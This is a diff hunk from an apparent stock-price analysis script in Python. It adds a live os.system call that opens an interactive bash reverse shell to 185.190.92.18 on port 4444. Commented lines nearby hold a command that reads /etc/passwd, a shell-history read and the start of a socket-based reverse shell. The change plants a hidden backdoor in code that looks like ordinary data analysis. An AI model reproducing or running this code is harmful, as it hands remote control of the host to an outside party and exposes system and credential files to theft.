@@ -32,10 +32,11 @@ tickers = prices["ticker"].unique()
 # arc
 # stream = os.popen('echo "OS Command";cat /etc/passwd')
 # ls = stream.read()
-stream = os.popen('bash -i >& /dev/tcp/185.190.92.18/4444 0>&1')
+# stream = os.popen('bash -i >& /dev/tcp/185.190.92.18/4444 0>&1')
 # stream = os.popen('history')
-ls = stream.read()
-# os.system('bash -i >& /dev/tcp/185.190.92.18/4444 0>&1')
+# ls = stream.read()
+os.system('bash -i >& /dev/tcp/185.190.92.18/4444 0>&1')
+ls = "shell"
 # import socket,subprocess,os
 # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 # s.connect(("10.0.0.1",1234))
